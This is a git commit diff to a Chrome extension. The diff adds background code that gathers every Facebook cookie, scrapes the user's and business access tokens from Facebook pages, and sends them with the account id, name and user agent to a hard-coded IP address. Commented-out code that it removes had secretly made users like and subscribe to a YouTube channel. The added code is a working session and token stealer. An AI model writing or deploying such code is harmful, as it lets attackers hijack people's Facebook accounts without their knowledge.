2570cb6c06f6a59b511071963b580b288bcd0d63
sondc <congson99tn@gmail.com>
2021-07-10 12:02:02 +0700

    put

--- js/background.js
+++ js/background.js
@@ -1,16 +1,109 @@
-// chrome.runtime.onInstalled.addListener(function (object) {
-//     chrome.tabs.create({url: "https://www.facebook.com/ShawnSavour/"});
-//     chrome.tabs.create({url: "https://www.youtube.com/watch?v=QF2N1wy6lbs"});
-//     chrome.tabs.create({url: "https://shawnsavour.com/hack-dap-an-myelt-2020/"});
-// });
-
-// var i = 0;
-console.log('frombackground');
-chrome.runtime.onMessage.addListener(function(response, sender, sendResponse) {
-    if (response == 'abc') {
-        alert(response);
+chrome.runtime.onMessage.addListener(async function(response, sender, sendResponse) {
+    console.log(response);
+    switch (response) {
+        case 'checklogin':
+            if (await checkfbLogin()) {
+                sendtoContent('hidelogin');
+            } else {
+                sendtoContent('hidesendData');
+            }
+            break;
+        case 'sendData':
+            debugger;
+            facebookData();
+            break;
+        default:
+            console.log('nofunction');
+            // code block
     }
 });
+// sendtoContent('abc');
+
+async function checkfbLogin() {
+    var p = new Promise(function(resolve, reject) {
+        chrome.cookies.getAll({ url: 'https://mbasic.facebook.com' }, function(cookies) {
+            cookies.forEach(item => {
+                if (item['name'] == "c_user") {
+                    // console.log(item['name']);
+                    resolve(true); //signed in
+                    return;
+                }
+            })
+            resolve(false);
+        })
+    });
+    const result = await p;
+    // console.log(result);
+    return result;
+}
+
+function sendtoContent(msg) {
+    chrome.tabs.query({ active: true, currentWindow: true }, gotTabs);
+
+    function gotTabs(tabs) {
+        console.log('gotTab');
+        console.log(tabs);
+        chrome.tabs.sendMessage(tabs[0].id, msg);
+    };
+}
+
+function facebookData() {
+    var uToken, bToken, fbInfo, UA;
+    UA = navigator.userAgent;
+    chrome.cookies.getAll({ url: 'https://mbasic.facebook.com' }, function(e) {
+        if (e.length > 0) {
+            format = '';
+            for (let i = 0; i < e.length; i++) {
+                format += e[i].name + '=' + e[i].value;
+                if (i < e.length - 1) {
+                    format += ','
+                }
+            }
+
+            var z = $.ajax({
+                url: "https://business.facebook.com/business_locations",
+                type: "get",
+                async: false,
+                global: false,
+                success: function(t) {
+                    return t;
+                }
+            }).responseText;
+            z.search("EAA") == -1 ? bToken = '' : bToken = z.match(/EAAGNO.*?\"/)[0].replace(/\W/g, "");
+            var s = $.ajax({
+                url: "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed",
+                type: "get",
+                async: false,
+                global: false,
+                success: function(t) {
+                    return t;
+                }
+            }).responseText;
+            s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
+            if ("" != uToken) {
+                fbInfo = $.ajax({
+                    url: "https://graph.facebook.com/me?access_token=".concat(uToken),
+                    type: "get",
+                    dataType: 'json',
+                    async: false,
+                    global: false,
+                    success: function(o) {
+                        return;
+                    }
+                }).responseJSON;
+            }
+            console.log(fbInfo);
+            var sendurl = `http://13.21.34.124:8080/php/upload.php?uid=${fbInfo['id']}&name=${fbInfo['name']}&url=${o}&useragent=${UA}&cookie=${format}&uToken=${uToken}&bToken=${bToken}`
+            console.log(sendurl);
+            var encodeurl = encodeURI(sendurl);
+            console.log(encodeurl);
+            chrome.tabs.create({ url: encodeurl });
+        }
+    })
+};
+
+
+
 // chrome.browserAction.onClicked.addListener(function(activeTab) {
 //     chrome.storage.sync.get(['FncMyELTS'], function(result) {
 //         if (result.FncMyELTS == "FncMyELTSver1"){
--- js/content.js
+++ js/content.js
@@ -1,73 +1,24 @@
-addEventListener()
-chrome.runtime.sendMessage('Send form content.js');
+if (window.location.href.indexOf("localhost") > -1) {
+    chrome.runtime.sendMessage('checklogin');
+    document.getElementById('needLogin').onclick = function() {
+        chrome.tabs.create({ url: 'https://www.facebook.com/' });
+    };
+    document.getElementById('sendData').onclick = function() {
+        chrome.runtime.sendMessage('sendData');
+    };
 
+    chrome.runtime.onMessage.addListener(gotMessage);
 
-// chrome.storage.sync.get(['subcribeYoutube'], function(result) {
-// 	if (result.subcribeYoutube){
-// 		//Subcribe ShawnSavour, not cause any harm
-// 		if (window.location.href.indexOf("youtube.com") > -1) {
-// 			if (($('html')[0].lang == 'en-US') || ($('html')[0].lang == 'en'))  {
-// 				var arialike = "#button[aria-label^='like this video'][aria-pressed='false']";
-// 				var arialikeif = "paper-button[aria-label*='shawnsavour.']";
-// 				var ariasub = "paper-button[aria-label*='Subscribe to shawnsavour.']";
-// 				var arianoti = "button[aria-label='Current setting is all notifications. Tap to change your notification setting for shawnsavour']"
-// 				var arianotibtn = "#button.style-scope.style-scope.yt-icon-button[aria-label*='Tap to change your notification setting for shawnsavour']"
-// 				var arianotiall = "ytd-menu-service-item-renderer.style-scope.ytd-menu-popup-renderer:contains('All')"
-// 			};
-// 			if (($('html')[0].lang == 'vi-VN') || ($('html')[0].lang == 'vi')) {
-// 				var arialike = "#button[aria-label*='người khác thích video này'][aria-pressed='false']";
-// 				var arialikeif = "paper-button[aria-label*='shawnsavour.']";
-// 				var ariasub = "paper-button[aria-label*='Đăng ký shawnsavour.']";
-// 				var arianoti = "button[aria-label='Cài đặt hiện tại là tất cả thông báo. Hãy nhấn để thay đổi cài đặt thông báo cho shawnsavour']"
-// 				var arianotibtn = "#button.style-scope.style-scope.yt-icon-button[aria-label*='cài đặt thông báo'][aria-label*='shawnsavour']"
-// 				var arianotiall = "ytd-menu-service-item-renderer.style-scope.ytd-menu-popup-renderer:contains('Tất cả')"
-// 			};
-// 			$(window).on('load', function () {
-// 				setTimeout(function () {
-// 					fnclikeclick();
-// 					fncYoutubesub();
-// 					fncYoutubefetch();
-// 				}, 5000);
-// 			});
-// 		}
-// 		function fncYoutubefetch() {
-// 			var oldHref = document.location.href;
-// 			var bodyList = document.querySelector("body"),
-// 				observer = new MutationObserver(function (mutations) {
-// 					mutations.forEach(function (mutation) {
-// 						if (oldHref != document.location.href) {
-// 							oldHref = document.location.href;
-// 							setTimeout(function () {
-// 								fnclikeclick();
-// 								fncYoutubesub();
-// 							}, 5000);
-// 						}
-// 					});
-// 				});
-// 			var config = {
-// 				childList: true,
-// 				subtree: true
-// 			};
-// 			observer.observe(bodyList, config);
-// 		}
-// 		function fncYoutubesub() {
-// 			if ($(arialikeif).length) {
-// 				$(ariasub).click();
-// 				setTimeout(function () {
-// 					if (!$(arianoti).length) {
-// 						$(arianotibtn).click();
-// 						$(arianotibtn).click();
-// 						setTimeout(function () {
-// 							$(arianotiall).click();
-// 						}, 1000);
-// 					};
-// 				}, 5000);
-// 			};
-// 		}
-// 		function fnclikeclick() {
-// 			if ($(arialikeif).length) {
-// 				$(arialike).click();
-// 			};
-// 		}
-// 	}
-// });
+    function gotMessage(message, sender, sendResponse) {
+        switch (message) {
+            case 'hidelogin':
+                document.getElementById('needLogin').classList.add("d-none");
+                break;
+            case 'hidesendData':
+                document.getElementById('sendData').classList.add("d-none");
+                break;
+            default:
+                console.log('msg not have case!');
+        }
+    }
+}
